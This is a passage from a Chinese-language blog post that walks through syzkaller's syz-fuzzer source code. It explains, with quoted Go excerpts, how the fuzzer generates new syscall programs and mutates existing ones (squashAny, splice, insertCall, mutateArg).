<code>prog.DupCallCollide()</code> （将程序中的部分调用进行复制并标记为异步），若未出错则直接返回</li><li>最后会调用 <code>prog.AssignRandomAsync()</code> （确保使用一个异步调用生产的资源的调用与其至少间隔一个非异步调用）并有 50% 的几率调用 <code>prog.AssignRandomRerun()</code>：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> randomCollide(origP *prog.Prog) *prog.Prog &#123;<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">5</span>) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Old-style collide with a 20% probability.</span><br>p, err := prog.DoubleExecCollide(origP, proc.rnd)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> p<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">4</span>) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Duplicate random calls with a 20% probability (25% * 80%).</span><br>p, err := prog.DupCallCollide(origP, proc.rnd)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> p<br>&#125;<br>&#125;<br>p := prog.AssignRandomAsync(origP, proc.rnd)<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">2</span>) != <span class="hljs-number">0</span> &#123;<br>prog.AssignRandomRerun(p, proc.rnd)<br>&#125;<br><span class="hljs-keyword">return</span> p<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="生成新输入-x2F-变异现有输入，执行"><a href="#生成新输入-x2F-变异现有输入，执行" class="headerlink" title="生成新输入&#x2F;变异现有输入，执行"></a>生成新输入&#x2F;变异现有输入，执行</h2><p>继续回到 <code>loop()</code> 的无限循环中，如果说全局 <code>WorkQueue</code> 空了，说明这个时候我们要自己想办法弄新的输入了，首先我们要获取 syz-fuzzer 当前的快照（其中包括语料库、语料库权重值、总的权重值），之后进行判断：</p><ul><li>若语料库为空，或是已经进行了 <code>generatePeriod</code> 次循环，此时调用 <code>target.Generate()</code> 生成新的输入程序</li><li>否则，选择一份现有的输入，调用 <code>prog.Mutate()</code> 将该输入进行变异，生成新的输入</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go">ct := proc.fuzzer.choiceTable<br>fuzzerSnapshot := proc.fuzzer.snapshot()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(fuzzerSnapshot.corpus) == <span class="hljs-number">0</span> || i%generatePeriod == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Generate a new prog.</span><br>p := proc.fuzzer.target.Generate(proc.rnd, prog.RecommendedCalls, ct)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: generated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatGenerate)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// Mutate an existing prog.</span><br>p := fuzzerSnapshot.chooseProgram(proc.rnd).Clone()<br>p.Mutate(proc.rnd, prog.RecommendedCalls, ct, proc.fuzzer.noMutate, fuzzerSnapshot.corpus)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: mutated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatFuzz)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="【核心】target-Generate-：生成一个新的输入程序"><a href="#【核心】target-Generate-：生成一个新的输入程序" class="headerlink" title="【核心】target.Generate()：生成一个新的输入程序"></a>【核心】target.Generate()：生成一个新的输入程序</h3><p>该函数本体其实比较简短，主要就是随机生成指定数量的系统调用并打包到一个新的 <code>Prog</code> 结构体当中，生成的依据主要是我们前面给出的 <code>ChoiceTable</code> 表，最后移除程序末尾多余的系统调用便直接返回了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Generate 生成一个带有 ncalls 个调用的随机程序.</span><br><span class="hljs-comment">// ct 包含一组允许的系统调用, 若为 nil 则将使用所有的系统调用.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> Generate(rs rand.Source, ncalls <span class="hljs-type">int</span>, ct *ChoiceTable) *Prog &#123;<br>p := &amp;Prog&#123;<br>Target: target,<br>&#125;<br>r := newRand(target, rs)<br>s := newState(target, ct, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &lt; ncalls &#123;<br>calls := r.generateCall(s, p, <span class="hljs-built_in">len</span>(p.Calls))<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> calls &#123;<br>s.analyze(c)<br>p.Calls = <span class="hljs-built_in">append</span>(p.Calls, c)<br>&#125;<br>&#125;<br><span class="hljs-comment">// 对于生成的最后一个调用而言，我们有可能在创造资源的同时增加额外的系统调用，</span><br><span class="hljs-comment">// 从而导致调用数量超过 ncalls。移除部分调用。</span><br>    <span class="hljs-comment">/* 译注：例如 read 需要一个 fd，那可能前面会再补一个 open */</span><br><span class="hljs-comment">// 在最后的调用中的资源会被替换为默认值,这便是我们所想要的。</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ncalls &#123;<br>p.RemoveCall(ncalls - <span class="hljs-number">1</span>)<br>&#125;<br>p.sanitizeFix()<br>p.debugValidate()<br><span class="hljs-keyword">return</span> p<br>&#125;<br><br></code></pre></td></tr></table></figure><p>生成单个系统调用的核心函数是 <code>generateCall()</code>：</p><ul><li>首先会检查 <code>insertPoint</code> 是否不为 0（为 0 则说明刚开始生成第一个系统调用），若是则随机选取程序中已有的一个调用，若其未设置 <code>NoGenerate</code> 属性则将其 id （系统调用号）作为 <code>biasCall</code>，即<strong>生成的第一个系统调用完全随机，后续系统调用则根据优先级表进行生成</strong></li><li>接下来调用 ChoiceTable 的 <code>choose</code> 方法，对于第一个系统调用而言其会从 ChoiceTable 中随机选取一个系统调用作为 <code>biasCall</code>，接下来从优先级表中选取 <code>biasCall</code> 对应的优先级数据，从中随机选取一个范围中优先级最高的一个返回</li><li>最后调用 <code>generateParticularCall()</code> 生成该系统调用所要用到的数据，这里就不展开了</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ct *ChoiceTable)</span></span> choose(r *rand.Rand, bias <span class="hljs-type">int</span>) <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">if</span> bias &lt; <span class="hljs-number">0</span> &#123;<span class="hljs-comment">/* 第一个系统调用，随机选择 */</span><br>bias = ct.calls[r.Intn(<span class="hljs-built_in">len</span>(ct.calls))].ID<br>&#125;<br><span class="hljs-keyword">if</span> !ct.Generatable(bias) &#123;<br>fmt.Printf(<span class="hljs-string">&quot;bias to disabled or non-generatable syscall %v\n&quot;</span>, ct.target.Syscalls[bias].Name)<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;disabled or non-generatable syscall&quot;</span>)<br>&#125;<br>run := ct.runs[bias]<br>x := <span class="hljs-type">int32</span>(r.Intn(<span class="hljs-type">int</span>(run[<span class="hljs-built_in">len</span>(run)<span class="hljs-number">-1</span>])) + <span class="hljs-number">1</span>)<span class="hljs-comment">/* 选择优先级范围 */</span><br>res := sort.Search(<span class="hljs-built_in">len</span>(run), <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> run[i] &gt;= x<br>&#125;)<br><span class="hljs-keyword">if</span> !ct.Generatable(res) &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;selected disabled or non-generatable syscall&quot;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> res<br>&#125;<br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *randGen)</span></span> generateCall(s *state, p *Prog, insertionPoint <span class="hljs-type">int</span>) []*Call &#123;<br>biasCall := <span class="hljs-number">-1</span><br><span class="hljs-keyword">if</span> insertionPoint &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Choosing the base call is based on the insertion point of the new calls sequence.</span><br>insertionCall := p.Calls[r.Intn(insertionPoint)].Meta<br><span class="hljs-keyword">if</span> !insertionCall.Attrs.NoGenerate &#123;<br><span class="hljs-comment">// We must be careful not to bias towards a non-generatable call.</span><br>biasCall = insertionCall.ID<br>&#125;<br>&#125;<br>idx := s.ct.choose(r.Rand, biasCall)<br>meta := r.target.Syscalls[idx]<br><span class="hljs-keyword">return</span> r.generateParticularCall(s, meta)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="【核心】prog-Mutate-：变异一个输入程序"><a href="#【核心】prog-Mutate-：变异一个输入程序" class="headerlink" title="【核心】prog.Mutate()：变异一个输入程序"></a>【核心】prog.Mutate()：变异一个输入程序</h3><p>该函数的核心其实是一个<strong>随机变异</strong>的循环，这里的变量 <code>r</code> 为一个随机数生成器：</p><ul><li>生成一个 <code>[0, 5)</code> 之间的随机数，若为 0 则执行 <code>mutator.squashAny()</code> </li><li>上一条未命中，则生成一个  <code>[0, 100)</code> 间随机数，若 &gt;&#x3D; 1 则执行 <code>mutator.splice()</code></li><li>上一条未命中，则生成一个 <code> [0, 31)</code> 间随机数，若 &gt;&#x3D; 20 则执行 <code>mutator.insertCall()</code></li><li>上一条未命中，则生成一个 <code>[0, 11)</code> 间随机数，若 &gt;&#x3D; 10 则执行 <code>mutateArg()</code></li><li>皆未命中，执行 <code>mutator.removeCall()</code></li></ul><p>终止循环的条件是 <code>上述变异操作之一成功执行 &amp; 系统调用数不为 0</code> ，此外还有 2&#x2F;3 的概率重新进入循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Mutate program p.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// p:           要变异的程序.</span><br><span class="hljs-comment">// rs:          随机数资源池.</span><br><span class="hljs-comment">// ncalls:      变异后程序中允许的最大调用数量.</span><br><span class="hljs-comment">// ct:          系统调用的 ChoiceTable.</span><br><span class="hljs-comment">// noMutate:    一组不该被变异的系统调用的 ID 集合.</span><br><span class="hljs-comment">// corpus:      包括原始程序 p 的整个语料库.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> Mutate(rs rand.Source, ncalls <span class="hljs-type">int</span>, ct *ChoiceTable, noMutate <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>, corpus []*Prog) &#123;<br>r := newRand(p.Target, rs)<br><span class="hljs-keyword">if</span> ncalls &lt; <span class="hljs-built_in">len</span>(p.Calls) &#123;<br>ncalls = <span class="hljs-built_in">len</span>(p.Calls)<br>&#125;<br>ctx := &amp;mutator&#123;<br>p:        p,<br>r:        r,<br>ncalls:   ncalls,<br>ct:       ct,<br>noMutate: noMutate,<br>corpus:   corpus,<br>&#125;<br><span class="hljs-keyword">for</span> stop, ok := <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>; !stop; stop = ok &amp;&amp; <span class="hljs-built_in">len</span>(p.Calls) != <span class="hljs-number">0</span> &amp;&amp; r.oneOf(<span class="hljs-number">3</span>) &#123;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> r.oneOf(<span class="hljs-number">5</span>):<br><span class="hljs-comment">// Not all calls have anything squashable,</span><br><span class="hljs-comment">// so this has lower priority in reality.</span><br>ok = ctx.squashAny()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>ok = ctx.splice()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">20</span>, <span class="hljs-number">31</span>):<br>ok = ctx.insertCall()<br><span class="hljs-keyword">case</span> r.nOutOf(<span class="hljs-number">10</span>, <span class="hljs-number">11</span>):<br>ok = ctx.mutateArg()<br><span class="hljs-keyword">default</span>:<br>ok = ctx.removeCall()<br>&#125;<br>&#125;<br>p.sanitizeFix()<br>p.debugValidate()<br><span class="hljs-keyword">if</span> got := <span class="hljs-built_in">len</span>(p.Calls); got &lt; <span class="hljs-number">1</span> || got &gt; ncalls &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;bad number of calls after mutation: %v, want [1, %v]&quot;</span>, got, ncalls))<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看这五个不同的变异方案</p><h4 id="mutator-squashAny-：随机变异一个系统调用的参数"><a href="#mutator-squashAny-：随机变异一个系统调用的参数" class="headerlink" title="mutator.squashAny()：随机变异一个系统调用的参数"></a>mutator.squashAny()：随机变异一个系统调用的参数</h4><p>该函数一开始会调用 <code>Prog.complexPtr()</code>，其中主要会调用 <code>ForEachArg()</code> 遍历用例程序的参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 选择一个随机的复杂指针并将其参数变为 ANY.</span><br><span class="hljs-comment">// 之后，若 ANY 中包含有 blob，变异一个随机的 blob.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> squashAny() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br>complexPtrs := p.complexPtrs()<br></code></pre></td></tr></table></figure><p>传入给 <code>ForEachArg()</code> 的回调函数主要调用 <code>isComplexPtr()</code> 判断每个调用的参数中是否存在复杂指针（多级指针），若是，则将该调用添加到作为返回值的数组中，<strong>即这个函数其实主要是针对多级指针的变异</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> complexPtrs() (res []complexPtr) &#123;<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> p.Calls &#123;<br>ForeachArg(c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, ctx *ArgCtx)</span></span> &#123;<br><span class="hljs-keyword">if</span> ptrArg, ok := arg.(*PointerArg); ok &amp;&amp; p.Target.isComplexPtr(ptrArg) &#123;<br>res = <span class="hljs-built_in">append</span>(res, complexPtr&#123;ptrArg, c&#125;)<br>ctx.Stop = <span class="hljs-literal">true</span><br>&#125;<br>&#125;)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会从返回列表中随机选择一个指针，若其对应的调用不允许变异则直接返回，若非指针则调用 <code>squashPtr()</code> </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">ptr := complexPtrs[r.Intn(<span class="hljs-built_in">len</span>(complexPtrs))]<br><span class="hljs-keyword">if</span> ctx.noMutate[ptr.call.Meta.ID] &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">if</span> !p.Target.isAnyPtr(ptr.arg.Type()) &#123;<br>p.Target.squashPtr(ptr.arg)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会调用 <code>ForEachSubArg()</code>（本质上为 <code>ForEachArgImpl()</code> 的封装），对之前随机选取的系统调用的参数进行遍历，这里传入的回调函数主要是检查 <code>arg.Dir()</code> 是否为 <code>DirOut</code>，若没有一个参数符合则直接返回 <code>false</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> blobs []*DataArg<br><span class="hljs-keyword">var</span> bases []*PointerArg<br>ForeachSubArg(ptr.arg, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, ctx *ArgCtx)</span></span> &#123;<br><span class="hljs-keyword">if</span> data, ok := arg.(*DataArg); ok &amp;&amp; arg.Dir() != DirOut &#123;<br>blobs = <span class="hljs-built_in">append</span>(blobs, data)<br>bases = <span class="hljs-built_in">append</span>(bases, ctx.Base)<br>&#125;<br>&#125;)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(blobs) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>最后一部分主要是调用 <code>analyze()</code> 进行分析，之后调用 <code>mutateData()</code> 来对参数的数据进行变异，以及对指针的更新</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 注意: 我们需要在变异之前调用 analyze.</span><br><span class="hljs-comment">// 在变异后其可以增长到超过数据区域的范围，</span><br><span class="hljs-comment">// 在标记现有分配时 analyze 将为 OOB 访问崩溃.</span><br>s := analyze(ctx.ct, ctx.corpus, p, ptr.call)<br><span class="hljs-comment">// TODO(dvyukov): 我们可能想要为 ANY 弄一个特别的变异.</span><br><span class="hljs-comment">// 例如，合并相邻的 ANYBLOBs (我们并不创造他们,</span><br><span class="hljs-comment">// 但他们能在将来出现); 或是用一个 blob 替代 ANYRES</span><br><span class="hljs-comment">// (并使用相邻的 blobs 将其合并).</span><br>idx := r.Intn(<span class="hljs-built_in">len</span>(blobs))<br>arg := blobs[idx]<br>base := bases[idx]<br>baseSize := base.Res.Size()<br>arg.data = mutateData(r, arg.Data(), <span class="hljs-number">0</span>, maxBlobLen)<br><span class="hljs-comment">// 若 size 变大了则更新基指针.</span><br><span class="hljs-keyword">if</span> baseSize &lt; base.Res.Size() &#123;<br>newArg := r.allocAddr(s, base.Type(), base.Dir(), base.Res.Size(), base.Res)<br>*base = *newArg<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mutator-splice-：随机选取语料库中一个程序的系统调用插入到程序随机位置中"><a href="#mutator-splice-：随机选取语料库中一个程序的系统调用插入到程序随机位置中" class="headerlink" title="mutator.splice()：随机选取语料库中一个程序的系统调用插入到程序随机位置中"></a>mutator.splice()：随机选取语料库中一个程序的系统调用插入到程序随机位置中</h4><p>该函数为编译过程当中概率最大的主分支，不过其逻辑比较简短：</p><ul><li>首先从语料库中随机复制一个程序</li><li>选择一个随机下标 <code>idx</code> ，在待变异程序该下标处插入 <code>p0</code> 的系统调用组</li><li>从末尾移除多余的调用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 译注：注释写得比较抽象这里就不贴了：）</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> splice() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ctx.corpus) == <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(p.Calls) &gt;= ctx.ncalls &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>p0 := ctx.corpus[r.Intn(<span class="hljs-built_in">len</span>(ctx.corpus))]<br>p0c := p0.Clone()<br>idx := r.Intn(<span class="hljs-built_in">len</span>(p.Calls))<br>p.Calls = <span class="hljs-built_in">append</span>(p.Calls[:idx], <span class="hljs-built_in">append</span>(p0c.Calls, p.Calls[idx:]...)...)<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(p.Calls) - <span class="hljs-number">1</span>; i &gt;= ctx.ncalls; i-- &#123;<br>p.RemoveCall(i)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mutator-insertCall-：随机生成一个系统调用插入到程序中随机位置"><a href="#mutator-insertCall-：随机生成一个系统调用插入到程序中随机位置" class="headerlink" title="mutator.insertCall()：随机生成一个系统调用插入到程序中随机位置"></a>mutator.insertCall()：随机生成一个系统调用插入到程序中随机位置</h4><p>该函数的逻辑也比较简短，若程序中调用数量已经达到 <code>ncalls</code> 的限制则直接返回，否则会先调用 <code>analyze()</code> 进行分析，随后调用 <code>generateCall()</code> 生成一个系统调用并插入到程序中的一个随机位置</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 在一个随机点（倾向于现有程序的末尾）插入一个随机调用</span><br><span class="hljs-comment">// 若该程序调用数量早已达到 ncalls（译注：限制数量）则不会插入）</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> insertCall() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) &gt;= ctx.ncalls &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>idx := r.biasedRand(<span class="hljs-built_in">len</span>(p.Calls)+<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">var</span> c *Call<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-built_in">len</span>(p.Calls) &#123;<br>c = p.Calls[idx]<br>&#125;<br>s := analyze(ctx.ct, ctx.corpus, p, c)<br>calls := r.generateCall(s, p, idx)<br>p.insertBefore(c, calls)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ctx.ncalls &#123;<br>p.RemoveCall(idx)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="mutator-mutateArg-：随机变异程序中某一系统调用的参数"><a href="#mutator-mutateArg-：随机变异程序中某一系统调用的参数" class="headerlink" title="mutator.mutateArg()：随机变异程序中某一系统调用的参数"></a>mutator.mutateArg()：随机变异程序中某一系统调用的参数</h4><p>该函数的主要作用便是随机变异程序中某一系统调用的参数，这里就不深入展开分析了，感兴趣可以直接看源码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> mutateArg() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br>idx := chooseCall(p, r)<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>c := p.Calls[idx]<br><span class="hljs-keyword">if</span> ctx.noMutate[c.Meta.ID] &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>updateSizes := <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> stop, ok := <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>; !stop; stop = ok &amp;&amp; r.oneOf(<span class="hljs-number">3</span>) &#123;<br>ok = <span class="hljs-literal">true</span><br>ma := &amp;mutationArgs&#123;target: 